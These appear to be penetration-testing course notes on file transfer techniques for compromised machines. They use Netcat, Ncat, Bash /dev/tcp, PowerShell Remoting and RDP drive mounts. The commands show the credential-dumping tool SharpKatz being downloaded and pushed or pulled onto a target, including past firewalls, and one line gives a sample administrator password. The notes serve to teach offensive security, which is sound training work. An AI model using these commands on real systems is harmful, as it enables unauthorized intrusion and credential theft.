### Miscellaneous File Transfer Methods

### Netcat
```
# The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. 
# Let's create an example and transfer a tool to our target.

# In this example, we'll transfer SharpKatz.exe from our localhost onto the compromised machine. 
# We'll do it using two methods. Let's work through the first one.
```

[SharpKatz](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe)
```
# We'll first start Netcat (nc) on the compromised machine, listening with option -l, 
# selecting the port to listen with the option -p 8000, 
# and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.

nc -l -p 8000 > SharpKatz.exe                 # Target host - Listening on Port 8000

# If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.

ncat -l -p 8000 --recv-only > SharpKatz.exe    # Target host - Listening on Port 8000
```

```
# From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. 
# The option -q 0 will tell Netcat to close the connection once it finishes. 
# That way, we'll know when the file transfer was completed.

wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe      # Localhost - Sending File to Compromised machine
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# By utilizing Ncat on our attacking host, we can opt for --send-only rather than -q. 
# The --send-only flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. 
# Typically, Ncat would continue running until the network connection is closed, 
# as the remote side may transmit additional data. 
# However, with --send-only, there is no need to anticipate further incoming information.

ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

# Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. 
# This method is useful in scenarios where there's a firewall blocking inbound connections. 
# Let's listen on port 443 on our localhost and send the file SharpKatz.exe as input to Netcat.

sudo nc -l -p 443 -q 0 < SharpKatz.exe   # Localhost - Sending File as Input to Netcat

nc 192.168.49.128 443 > SharpKatz.exe    # Target host Connect to Netcat to Receive the File
```

```
# Let's do the same with Ncat:

sudo ncat -l -p 443 --send-only < SharpKatz.exe           # Local Host - Sending File as Input to Ncat

ncat 192.168.49.128 443 --recv-only > SharpKatz.exe       # Target Host - Connect to Ncat to Receive the File
```

```
# If we don't have Netcat or Ncat on our compromised machine, 
# Bash supports read/write operations on a pseudo-device file /dev/TCP/.
# Writing to this particular file makes Bash open a TCP connection to host:port, 
# and this feature may be used for file transfers.

sudo nc -l -p 443 -q 0 < SharpKatz.exe                # Local Host - Sending File as Input to Ncat (nc)

sudo ncat -l -p 443 --send-only < SharpKatz.exe       # Local Host - Sending File as Input to Ncat (ncat)

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe     # Target Host - Connecting to Netcat Using /dev/tcp to Receive the File
```

### PowerShell Session File Transfer

```
# We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. 
# If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

# PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
# By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. 
# The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

# To create a PowerShell Remoting session on a remote computer, we will need administrative access, 
# be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. 
# Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.
```

```
# We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. 
# Let's use Test-NetConnection to confirm we can connect to WinRM.

PS C:\file-transfer> whoami

file-transfer\administrator

PS C:\file-transfer> hostname

DC01

PS C:\file-transer> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True

# Because this session already has privileges over DATABASE01, we don't need to specify credentials. 
# In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session.

# Create a PowerShell Remoting Session to DATABASE01
PS C:\file-transer> $Session = New-PSSession -ComputerName DATABASE01       

# Copy samplefile.txt from our Localhost to the DATABASE01 Session
PS C:\file-transer> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy DATABASE.txt from DATABASE01 Session to our Localhost
PS C:\file-transer> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

```
# If we are connected from Linux, we can use xfreerdp or rdesktop. 
# At the time of writing, xfreerdp and rdesktop allow copy from our target machine to the RDP session, 
# but there may be scenarios where this may not work as expected.

# As an alternative to copy and paste, we can mount a local resource on the target RDP server. 
# rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session.


rdesktop 10.10.10.132 -d file-transer -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'   # Mounting a Linux Folder Using rdesktop

xfreerdp /v:10.10.10.132 /d:file-transer /u:administrator /p:'Password0@' /drive:linux,/home/user/filetransfer     # Mounting a Linux Folder Using xfreerdp
```
